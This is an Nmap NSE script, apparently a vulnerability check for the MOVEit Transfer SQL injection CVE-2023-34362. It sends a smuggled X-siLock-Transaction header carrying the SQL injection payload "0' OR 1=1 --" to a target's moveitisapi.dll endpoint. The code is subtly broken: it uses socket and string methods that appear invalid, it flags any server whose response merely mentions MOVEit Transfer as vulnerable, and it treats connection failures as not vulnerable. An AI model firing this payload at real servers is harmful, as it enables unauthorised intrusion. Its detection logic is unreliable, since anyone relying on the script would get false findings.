local nmap = require "nmap"
local stdnse = require "stdnse"
local vulns = require "vulns"
local shortport = require "shortport"

description = [[
Detects CVE-2023-34362 in MOVEit Transfer servers by attempting an unauthenticated SQL injection.
]]

author = "glue"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln"}

portrule = shortport.http

action = function(host, port)
    local vuln = {
        title = "MOVEit Transfer SQL Injection (CVE-2023-34362)",
        state = vulns.STATE.UNKNOWN,
        description = "MOVEit Transfer is vulnerable to unauthenticated SQL injection that allows remote attackers to execute arbitrary SQL commands.",
        references = {
            "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
        }
    }

    local request = string.format(
        "GET /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1\r\n" ..
        "Host: %s:%d\r\n" ..
        "User-Agent: Mozilla/5.0\r\n" ..
        "X-siLock-Test: abcdX-SILOCK-Transaction: folder_add_by_path\r\n" ..
        "X-siLock-Transaction: 0' OR 1=1 -- \r\n" ..
        "Connection: close\r\n\r\n",
        host.ip, port.number
    )

    stdnse.print_debug(1, "Checking %s:%d for CVE-2023-34362", host.ip, port.number)

    local sock = nmap.new_socket()
    sock:set_timeout(5000)

    local status, err = sock:connect(host.ip, port.number, "ssl")
    if not status then
        stdnse.print_debug(1, "Failed to connect to %s:%d", host.ip, port.number)
        vuln.state = vulns.STATE.NOT_VULN
        vuln.check_results = string.format("Connection error: %s", err)
        return vulns.Report:new(SCRIPT_NAME, host, port):make_output(vuln)
    end

    sock:send(request)
    local response = sock:receive_buf_all()
    sock:close()

    if not response then
        stdnse.print_debug(1, "No response from %s:%d", host.ip, port.number)
        vuln.state = vulns.STATE.NOT_VULN
        vuln.check_results = "No response from target"
        return vulns.Report:new(SCRIPT_NAME, host, port):make_output(vuln)
    end

    stdnse.print_debug(1, "Response: %s", response:tostring())

    if response:tostring():find("MOVEit Transfer") then
        vuln.state = vulns.STATE.VULN
    else
        vuln.state = vulns.STATE.NOT_VULN
    end

    return vulns.Report:new(SCRIPT_NAME, host, port):make_output(vuln)
end
